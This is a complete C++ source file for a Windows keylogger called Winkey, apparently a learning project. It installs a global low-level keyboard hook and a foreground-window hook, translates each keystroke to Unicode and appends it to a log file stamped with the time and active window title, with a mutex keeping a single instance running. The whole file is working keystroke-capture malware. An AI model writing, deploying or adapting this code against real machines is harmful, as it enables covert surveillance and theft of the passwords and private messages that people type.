#include "Winkey.hpp"

std::wofstream	Winkey::_logFile;
wchar_t			Winkey::_windowTitle[256];
HWND		    Winkey::_currentWindow;
std::wstring	Winkey::_keyStroke;

Winkey::Winkey(): _logFileName(TW_LOGFILE) {
    // Prevent multiple instances of this program
    _singleInstanceMutex = CreateMutex(NULL, TRUE, TEXT(TW_MUTEX_NAME));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        throw InstanceAlreadyRunnningException();

    // Open the outfile in appending mode
    _logFile.open(TW_LOGFILE, std::ios::app);
    if (!_logFile.is_open()) throw FileOpenFailureException();

    // Set window and keyboard hooks
    try { setHooks(); } catch (HookSettingFailureException &e) {
        throw std::runtime_error(e.what());
    }
}

void Winkey::setHooks() {
    // Set the event hook for foreground window changes (out-of-context)
    _winEventHook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
        NULL,
        winEventProc,
        0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
    );
    if (!_winEventHook) throw HookSettingFailureException();

    // Install global low-level keyboard hook to intercept keystrokes
    _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
    if (!_keyboardHook) throw HookSettingFailureException();
}

void Winkey::run() {
    /*
     * Main message loop
     * Blocks until a Windows message (like an event) is available.
     * The loop only stops when receiving `WM_QUIT`.
     */

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
}

// Log the keystroke data to the log file
void Winkey::logToFile() {
    static HWND lastWindow = nullptr;

    // Only log the window title if it has changed
    if (_currentWindow != lastWindow) {
        time_t      now = time(nullptr);
        // Converts time_t into a tm structure representing the local time
        //  (hours, minutes, day, month, etc.)
        struct tm   localTime {};
        if (_windowTitle && localtime_s(&localTime, &now) == 0) {
            // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
            // `L` is for wide characters (Unicode)
            _logFile << L"\n\n[" << std::setfill(L'0')
                    << std::setw(2) << localTime.tm_mday << L"."
                    << std::setw(2) << (localTime.tm_mon + 1) << L"."
                    << (localTime.tm_year + 1900) << L" "
                    << std::setw(2) << localTime.tm_hour << L":"
                    << std::setw(2) << localTime.tm_min << L":"
                    << std::setw(2) << localTime.tm_sec << L"] - '"
                    << _windowTitle << L"'" << std::endl;
        }
    }
    lastWindow = _currentWindow;

     _logFile << _keyStroke;
    // Ensure that everything written to the file is immediately pushed to disk
    _logFile.flush();
}

// Write the timestamp + current active window name to the log file
void CALLBACK Winkey::winEventProc(
    const HWINEVENTHOOK /*hWinEventHook*/, const DWORD event, const HWND hwnd,
    LONG /*idObject*/, LONG /*idChild*/, DWORD /*dwEventThread*/, DWORD /*dwmsEventTime*/
)
{
    _currentWindow = hwnd;
    if (event == EVENT_SYSTEM_FOREGROUND) {
        // We use wide characters (wchar_t) + Unicode (W) version of the function
        wchar_t windowTitle[256] = {};
        GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

        // Sanitize the window title
        for (size_t i = 0; windowTitle[i] != L'\0'; ++i)
            if (!isascii(windowTitle[i]))
                windowTitle[i] = L'?';  // replace non-printable chars

        // Save the current window title to log it later
        memcpy(_windowTitle, windowTitle, 256);
    }
}

/*
 * Low-level keyboard hook callback.
 *
 * @param   nCode   Code the system passes to the hook procedure to indicate
 *                  the action to be taken.
 * @param   wParam  The message type.
 * @param   lParam  Points to a KBDLLHOOKSTRUCT structure that contains detailed
 *                  information about the keyboard event (which key, scan code,
 *                  flags, etc.).
 * 
 * @return  CallNextHookEx
 *          - LRESULT is a Windows data type used for return values from
 *              window procedures and hook functions.
 *          - CALLBACK is a macro defining the calling convention of the function
 *              (specifies how parameters are passed and who cleans the stack).
 */

LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
    const int nCode, const WPARAM wParam, const LPARAM lParam
)
{
    /*
     * HC_ACTION        Process the event normally.
     * WM_KEYDOWN       Key pressed
     * WM_SYSKEYDOWN    System key pressed (like ALT)
     */

    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        static DWORD            LastVkCode = 0;
        static size_t           LastVkCodeCount = 1;
        const KBDLLHOOKSTRUCT*  p = (KBDLLHOOKSTRUCT*)lParam;

        // Check if the same key hasn't been typed repetitively
        if (p->vkCode == LastVkCode) {
            ++LastVkCodeCount;
            // If the maximum repetition count is reached, quit
            if (LastVkCodeCount > TW_MAX_SAME_VK)
                return CallNextHookEx(NULL, nCode, wParam, lParam);
        } else LastVkCodeCount = 1; // If not reached, reset the counter

        LastVkCode = p->vkCode;

        BYTE            keyboardState[256];
        std::wstring    buffer(5, L'\0');

        /*
         * Get the current state of all keys
         *
         * GetKeyboardState() retrieves the keyboard state for the calling thread,
         *  not the one generating the event. 
         * 
         * This is why we need to manually update the state of modifier keys
         *  (like Shift, Ctrl, Alt) if we want, for instance, the characters to be
         *  uppercase when Shift is hold.
         */

        GetKeyboardState(keyboardState);

        // Set modifier keys manually
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            keyboardState[VK_SHIFT] |= 0x80;
        if (GetKeyState(VK_CAPITAL) & 0x0001) // toggle bit, not pressed
            keyboardState[VK_CAPITAL] |= 0x01;
        else
            keyboardState[VK_CAPITAL] &= ~0x01; // Clear the toggle state if not toggled
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
            keyboardState[VK_CONTROL] |= 0x80;
        if (GetAsyncKeyState(VK_MENU) & 0x8000) // Alt key
            keyboardState[VK_MENU] |= 0x80;

        // Gets the input language layout of the current thread
        const HKL layout = GetKeyboardLayout(0);
        
        /*
         * Converts the virtual key code (vkCode) and scan code into the
         *  corresponding Unicode character(s)
         * 
         * vkCode:
         *  - A Windows-defined constant that identifies a logical key,
         *      like "A", "Shift", "Enter", "F1", etc.
         *  - Same across keyboards: for example, VK_A always refers to the A key,
         *      no matter where it is on the keyboard.
         * 
         * scanCode:
         *  - A hardware-generated code from the keyboard itself.
         *  - Represents the physical location of the key on the keyboard.
         */

        int result = ToUnicodeEx(
            p->vkCode, p->scanCode, keyboardState,
            &buffer[0], (int)buffer.size(),
            0, layout
        );

        /* 
         * Log character to file or, if no valid character was produced
         *  (like arrow keys, function keys, Ctrl+C), log a fallback string that includes
         *  the virtual key code.
         */

        if (result > 0 && buffer[0] >= 32)
            _keyStroke = buffer;
        else
            _keyStroke = getKeyName(p->vkCode);

        logToFile();
    }

    // Pass the event to the next hook
    // (Otherwise, we will swallow the event and suppress it)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

Winkey::~Winkey() {
    if (_winEventHook)          UnhookWinEvent(_winEventHook);
    if (_keyboardHook)          UnhookWindowsHookEx(_keyboardHook);
    if (_singleInstanceMutex)   CloseHandle(_singleInstanceMutex);
    if (_logFile.is_open())     _logFile.close();
}

int main() {
    try {
        Winkey w;
        w.run();
    } catch (std::exception &e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}
